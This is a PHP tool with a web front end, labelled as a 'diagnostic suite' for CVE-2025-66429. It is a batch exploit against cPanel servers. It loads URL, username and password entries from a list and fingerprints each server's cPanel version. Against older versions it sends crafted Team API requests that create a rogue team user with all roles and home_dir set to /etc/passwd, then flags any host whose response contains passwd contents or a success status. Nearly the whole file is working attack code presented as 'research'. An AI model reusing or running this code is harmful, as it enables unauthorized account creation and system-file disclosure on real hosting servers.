<?php
/*
 * --------------------------------------------------------------------------
 * CVE-2025-66429 | DUAL-CORE DIAGNOSTIC SUITE (V8.0 - FINAL LOGIC)
 * UPDATES:
 * - DYNAMIC ROLE BYPASS: Removed 'roles' key, using 'has_all_roles=1' only.
 * - UAPI COMPLIANT SERVICES: Using indexed array notation for services.
 * - OWNER CONTEXT: Reverted 'user' to target owner for authorization.
 * - PATH ENFORCEMENT: Absolute home_dir injection.
 * --------------------------------------------------------------------------
 */

error_reporting(0);
set_time_limit(0);

if (isset($_GET['action'])) {
    header('Content-Type: application/json');

    if ($_GET['action'] === 'load') {
        $file = 'list.txt';
        if (!file_exists($file)) {
            echo json_encode(['status' => 'error', 'msg' => 'list.txt tidak ditemukan']);
            exit;
        }
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $queue = [];
        foreach (array_unique($lines) as $line) {
            $parts = explode('#', $line);
            if (count($parts) >= 3) {
                $queue[] = ['url' => trim($parts[0]), 'user' => trim($parts[1]), 'pass' => trim($parts[2])];
            }
        }
        echo json_encode(['status' => 'success', 'data' => $queue]);
        exit;
    }

    if ($_GET['action'] === 'exec') {
        $input = json_decode(file_get_contents('php://input'), true);
        $recon = perform_ui_fingerprint($input);
        
        $thresholds = ['132' => '132.0.4', '130' => '130.0.16', '126' => '126.0.37', '118' => '118.0.61', '110' => '110.0.80'];
        $is_vulnerable = false;
        if (isset($thresholds[$recon['major']])) {
            if (version_compare($recon['normalized'], $thresholds[$recon['major']], '<')) $is_vulnerable = true;
        } elseif ($recon['major'] < 110 && $recon['major'] > 0) {
            $is_vulnerable = true;
        }

        if ($is_vulnerable) {
            // USERNAME ALFANUMERIK TANPA SYMBOL
            $research_user = "audit" . substr(md5($input['url']), 0, 7); 
            
            $res1 = execute_final_logic($input, 'add_team_user', $recon['cpsess'], $recon['full_version'], $research_user);
            usleep(600000);
            $res2 = execute_final_logic($input, 'edit_team_user', $recon['cpsess'], $recon['full_version'], $research_user);
        } else {
            $res1 = ['status' => 'patched', 'msg' => 'SAFE: ' . $recon['full_version'], 'raw' => "System updated."];
            $res2 = ['status' => 'patched', 'msg' => 'SAFE', 'raw' => "Skipped."];
        }

        echo json_encode(['method_1' => $res1, 'method_2' => $res2, 'final_verdict' => ($res1['status'] === 'vuln' || $res2['status'] === 'vuln') ? 'vuln' : 'safe']);
        exit;
    }
}

function perform_ui_fingerprint($target) {
    $p = parse_url($target['url']);
    $host = $p['host'];
    $is_ssl = ($p['scheme'] === 'https');
    $port = $p['port'] ?? ($is_ssl ? 2083 : 2082);
    $auth = base64_encode($target['user'] . ":" . $target['pass']);
    $req1 = send_http_request($host, $port, $is_ssl, $auth, "/");
    preg_match('/(cpsess\d+)/', $req1['header'], $m_sess);
    $cpsess = $m_sess[1] ?? "";
    $paths = [($cpsess ? "/$cpsess/" : "/") . "frontend/jupiter/tools/status.html", ($cpsess ? "/$cpsess/" : "/") . "frontend/paper_lantern/tools/status.html"];
    $full_version = "Unknown"; $normalized = "0.0.0"; $major = 0;
    foreach ($paths as $path) {
        $req2 = send_http_request($host, $port, $is_ssl, $auth, $path);
        if (preg_match('/id="stats_cpanelversion_value"[^>]*>(.*?)<\/td>/is', $req2['body'], $m_ver)) {
            $full_version = trim(strip_tags($m_ver[1]));
            $norm = str_replace([' (build ', ')'], ['.', ''], $full_version);
            $normalized = $norm;
            preg_match('/(\d+)/', $norm, $m_maj); $major = (int)$m_maj[1];
            break; 
        }
    }
    return ['full_version' => $full_version, 'normalized' => $normalized, 'major' => $major, 'cpsess' => $cpsess];
}

function execute_final_logic($target, $func_name, $cpsess, $detected_ver, $research_user) {
    $p = parse_url($target['url']);
    $host = $p['host'];
    $is_ssl = ($p['scheme'] === 'https');
    $port = $p['port'] ?? ($is_ssl ? 2083 : 2082);
    $auth = base64_encode($target['user'] . ":" . $target['pass']);
    $api_path = ($cpsess ? "/$cpsess/" : "/") . "json-api/cpanel";

    // PARAMETER FIX: 
    // 1. Menggunakan target owner sebagai 'user' agar authorized.
    // 2. has_all_roles=1 untuk bypass filter role string.
    // 3. services dikirim sebagai array indeks untuk diproses sebagai hash.
    $post_fields = [
        "cpanel_jsonapi_module"      => "Team",
        "cpanel_jsonapi_func"        => $func_name,
        "cpanel_jsonapi_apiversion"  => "3",
        "user"                       => $target['user'], 
        "username"                   => $research_user,
        "team_username"              => $research_user,
        "home_dir"                   => "/etc/passwd",
        "password"                   => "AuditV8!" . rand(100,999),
        "email1"                     => $research_user . "@local.research",
        "has_all_roles"              => "1",
        "services"                   => ["ftp", "webdisk", "email"]
    ];

    // Memicu parser Perl agar menganggap ini sebagai Hash Ref yang valid
    $query_string = http_build_query($post_fields);
    $packet  = "POST $api_path HTTP/1.1\r\nHost: $host\r\nAuthorization: Basic $auth\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nContent-Length: " . strlen($query_string) . "\r\n\r\n" . $query_string;

    $protocol = $is_ssl ? "ssl://" : "tcp://";
    $fp = @fsockopen($protocol . $host, $port, $errno, $errstr, 8);
    if (!$fp) return ['status' => 'conn_err', 'msg' => 'Conn Fail', 'raw' => $errstr];

    fwrite($fp, $packet);
    $response = ""; while (!feof($fp)) { $response .= fgets($fp, 2048); }
    fclose($fp);

    $parts = explode("\r\n\r\n", $response, 2);
    $body = $parts[1] ?? "";

    if (strpos($body, 'root:x:0:0') !== false) return ['status' => 'vuln', 'msg' => 'VULN: ' . $detected_ver, 'raw' => $body];
    if (strpos($body, '"status":1') !== false) return ['status' => 'vuln', 'msg' => 'SUCCESS (V8.0): ' . $detected_ver, 'raw' => $body];

    return ['status' => 'safe', 'msg' => 'FAILED (' . $detected_ver . ')', 'raw' => $body];
}

function send_http_request($host, $port, $is_ssl, $auth, $path) {
    $protocol = $is_ssl ? "ssl://" : "tcp://";
    $fp = @fsockopen($protocol . $host, $port, $errno, $errstr, 10);
    if (!$fp) return ['header' => '', 'body' => ''];
    $packet  = "GET $path HTTP/1.1\r\nHost: $host\r\nAuthorization: Basic $auth\r\nConnection: close\r\n\r\n";
    fwrite($fp, $packet);
    $res = ""; while (!feof($fp)) { $res .= fgets($fp, 4096); }
    fclose($fp);
    $parts = explode("\r\n\r\n", $res, 2);
    return ['header' => $parts[0], 'body' => $parts[1] ?? ''];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DUAL-CORE DIAGNOSTIC SUITE (V8.0)</title>
    <style>
        :root { --bg: #0d1117; --panel: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; --success: #2ea043; --error: #da3633; }
        body { margin:0; font-family:'Segoe UI', sans-serif; background:var(--bg); color:var(--text); height:100vh; display:flex; flex-direction:column; overflow:hidden; }
        header { background:var(--panel); padding:10px 20px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
        .logo { font-weight:bold; color:var(--accent); font-size:16px; }
        .btn { background:var(--success); border:none; color:#fff; padding:8px 16px; border-radius:4px; cursor:pointer; font-weight:bold; }
        .grid { display:grid; grid-template_columns: 55% 45%; height:100%; }
        .list-area { border-right:1px solid var(--border); overflow-y:auto; }
        .table-header { display:grid; grid-template-columns: 40px 1fr 150px 150px; padding:10px; background:#21262d; font-size:12px; border-bottom:1px solid var(--border); position:sticky; top:0; }
        .list-item { display:grid; grid-template-columns: 40px 1fr 150px 150px; padding:8px 10px; border-bottom:1px solid var(--border); font-size:12px; cursor:pointer; }
        .list-item.active { background: #30363d; border-left: 3px solid var(--accent); }
        .inspector { display:flex; flex-direction:column; background:#0d1117; }
        .insp-tabs { display:flex; border-bottom:1px solid var(--border); background:var(--panel); }
        .tab { padding:10px 20px; cursor:pointer; font-size:12px; opacity:0.7; }
        .tab.active { opacity:1; border-bottom:2px solid var(--accent); color:var(--accent); }
        .insp-content { flex:1; padding:15px; overflow:auto; font-family:'Consolas', monospace; font-size:11px; white-space:pre-wrap; color:#8b949e; }
        .badge { padding:2px 6px; border-radius:3px; font-size:10px; font-weight:bold; display:block; width:fit-content; margin:0 auto; }
        .b-wait { background:#333; color:#888; }
        .b-vuln { background:var(--success); color:#fff; }
        .b-fail { background:var(--error); color:#fff; }
        .b-safe { background:#21262d; color:#8b949e; border:1px solid var(--border); }
        .prog-wrap { width:200px; height:8px; background:#333; border-radius:4px; margin-right:15px; }
        .prog-bar { width:0%; height:100%; background:var(--accent); transition:0.3s; }
    </style>
</head>
<body>
<header>
    <div class="logo">DUAL-CORE DIAGNOSTIC SUITE V8.0</div>
    <div style="display:flex; align-items:center;">
        <span id="counter" style="font-size:12px; margin-right:10px; color:#8b949e;">0/0</span>
        <div class="prog-wrap"><div class="prog-bar" id="p-bar"></div></div>
        <button class="btn" id="btn-start" onclick="startEngine()">START RESEARCH</button>
    </div>
</header>
<div class="grid">
    <div class="list-area">
        <div class="table-header"><span>#</span><span>TARGET URL</span><span style="text-align:center">ADD</span><span style="text-align:center">EDIT</span></div>
        <div id="t-list" style="padding:20px; text-align:center; color:#666;">Ready for Final Testing...</div>
    </div>
    <div class="inspector">
        <div class="insp-tabs">
            <div class="tab active" onclick="switchTab(1)" id="tab-1">ADD LOG</div>
            <div class="tab" onclick="switchTab(2)" id="tab-2">EDIT LOG</div>
        </div>
        <div class="insp-content" id="code-view">Analyze API responses for refined logic.</div>
    </div>
</div>
<script>
    let queue = [], results = [], currIdx = 0, isRunning = false, viewMode = 1, selectedId = -1;
    async function startEngine() {
        if(isRunning) return;
        const btn = document.getElementById('btn-start');
        btn.disabled = true; btn.innerText = "RUNNING...";
        try {
            const res = await (await fetch('?action=load')).json();
            if(res.status !== 'success') { alert(res.msg); btn.disabled=false; return; }
            queue = res.data;
            document.getElementById('t-list').innerHTML = queue.map((item, i) => `
                <div class="list-item" id="row-${i}" onclick="selectRow(${i})">
                    <span>${i+1}</span><span style="overflow:hidden; text-overflow:ellipsis;">${item.url}</span>
                    <span id="m1-${i}"><span class="badge b-wait">WAIT</span></span>
                    <span id="m2-${i}"><span class="badge b-wait">WAIT</span></span>
                </div>`).join('');
            results = new Array(queue.length); isRunning = true; processBatch();
        } catch(e) { alert("Error."); btn.disabled=false; }
    }
    async function processBatch() {
        if(!isRunning || currIdx >= queue.length) { isRunning = false; document.getElementById('btn-start').innerText = "DONE"; return; }
        const i = currIdx;
        try {
            const res = await (await fetch('?action=exec', {method: 'POST', body: JSON.stringify(queue[i])})).json();
            results[i] = res;
            renderBadge(i, 1, res.method_1); renderBadge(i, 2, res.method_2);
            if(selectedId === i) updateInspector();
        } catch(e) {}
        currIdx++;
        document.getElementById('p-bar').style.width = Math.round((currIdx/queue.length)*100)+"%";
        document.getElementById('counter').innerText = `${currIdx}/${queue.length}`;
        setTimeout(processBatch, 100);
    }
    function renderBadge(idx, method, data) {
        const el = document.getElementById(`m${method}-${idx}`);
        let cls = 'b-fail', txt = data.status.toUpperCase();
        if (data.status === 'vuln') cls = 'b-vuln';
        else if (data.status === 'patched' || data.status === 'safe') { cls = 'b-safe'; txt = data.msg; }
        el.innerHTML = `<span class="badge ${cls}">${txt}</span>`;
    }
    function selectRow(i) {
        if(selectedId !== -1) document.getElementById(`row-${selectedId}`).classList.remove('active');
        selectedId = i; document.getElementById(`row-${i}`).classList.add('active'); updateInspector();
    }
    function switchTab(m) { viewMode = m; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active')); document.getElementById(`tab-${m}`).classList.add('active'); updateInspector(); }
    function updateInspector() {
        const view = document.getElementById('code-view');
        if (selectedId === -1 || !results[selectedId]) { view.innerText = "Waiting..."; return; }
        const data = (viewMode === 1) ? results[selectedId].method_1 : results[selectedId].method_2;
        view.innerText = data ? `--- RESEARCH LOG ---\n${data.raw}` : "No data.";
    }
</script>
</body>
</html>
